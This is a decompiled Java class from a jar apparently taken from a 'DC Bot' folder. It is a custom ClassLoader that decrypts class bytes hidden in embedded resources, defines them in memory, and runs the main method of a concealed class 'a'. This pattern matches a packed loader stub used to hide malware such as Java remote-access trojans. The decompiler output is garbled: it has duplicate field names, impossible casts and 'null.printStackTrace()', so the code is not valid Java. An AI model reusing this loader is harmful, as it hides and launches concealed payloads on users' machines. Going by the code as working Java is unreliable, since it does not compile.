package net.java;

import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.lang.reflect.Method;
import java.util.HashMap;

public class m extends ClassLoader {
  public static String a = "_STORED_UPDATE";
  
  private static String b = "/net/java/a";
  
  private static String c = "/net/java/b";
  
  private static String d = "/net/java/c";
  
  private static String e = "/net/java/d";
  
  private static String f = "/net/java/e";
  
  private static long a = -1083759330220665782L;
  
  private static long b = -4062297973245990737L;
  
  private HashMap a = new HashMap<Object, Object>();
  
  public m() {
    byte[] arrayOfByte = l.b(l.a(b, "\\a"));
    DataInputStream dataInputStream = new DataInputStream(new ByteArrayInputStream(arrayOfByte));
    try {
      while (dataInputStream.available() > 0) {
        String str = dataInputStream.readUTF();
        byte[] arrayOfByte1 = new byte[dataInputStream.readInt()];
        dataInputStream.readFully(arrayOfByte1);
        this.a.put(str, arrayOfByte1);
      } 
      return;
    } catch (Exception exception) {
      null.printStackTrace();
      return;
    } 
  }
  
  public synchronized Class loadClass(String paramString) {
    Class<?> clazz;
    byte[] arrayOfByte;
    return (Class)(((clazz = findLoadedClass(paramString)) == null) ? (((arrayOfByte = (byte[])this.a.get(paramString)) == null) ? super.loadClass(paramString) : defineClass(paramString, arrayOfByte, 0, arrayOfByte.length)) : arrayOfByte);
  }
  
  public static void a() {
    l.a = (short[])d;
    l.b = (short[][])c;
    l.a = (short[])a;
    l.b = b;
  }
  
  public static void main(String[] paramArrayOfString) {
    a();
    m m1 = new m();
    try {
      Method method = m1.loadClass("a").getDeclaredMethod("main", new Class[] { String[].class });
      String[] arrayOfString;
      (arrayOfString = new String[paramArrayOfString.length + 6])[0] = b;
      arrayOfString[1] = c;
      arrayOfString[2] = d;
      arrayOfString[3] = e;
      arrayOfString[4] = f;
      arrayOfString[5] = (String)a;
      System.arraycopy(paramArrayOfString, 0, arrayOfString, 6, paramArrayOfString.length);
      method.invoke(null, new Object[] { arrayOfString });
      return;
    } catch (Throwable throwable) {
      return;
    } 
  }
}


/* Location:              C:\Users\yanic\OneDrive\DC Bot\8tjpjeap.jar!\net\java\m.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       1.1.3
 */